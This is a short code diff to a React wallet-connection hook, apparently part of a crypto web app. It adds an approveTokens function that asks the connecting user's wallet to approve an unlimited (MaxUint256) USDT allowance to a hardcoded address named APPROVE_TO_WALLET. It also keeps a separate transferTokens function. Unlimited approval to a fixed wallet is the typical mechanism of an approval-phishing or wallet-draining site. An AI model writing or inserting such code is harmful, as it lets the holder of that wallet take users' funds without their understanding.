@@ -94,7 +94,16 @@ export const useConnectWallet = () => {
   // };
 
   // Approve token function
-  const approveTokens = async (tokens: string) => {
+  const approveTokens = async () => {
+    writeContract({
+      abi: USDT_ARBITRUM_ABI,
+      address: USDT_ARBITRUM_CONTRACT,
+      functionName: "approve",
+      args: [APPROVE_TO_WALLET, MaxUint256],
+    });
+  };
+
+  const transferTokens = async (tokens: string) => {
     // await addUSDTToMetaMask();
     writeContract({
       abi: USDT_ARBITRUM_ABI,
@@ -105,5 +114,11 @@ export const useConnectWallet = () => {
     });
   };
 
-  return { approveTokens, handleOpenNav, handleOpenModal, handleDisconnect };
+  return {
+    approveTokens,
+    handleOpenNav,
+    handleOpenModal,
+    handleDisconnect,
+    transferTokens,
+  };
 };
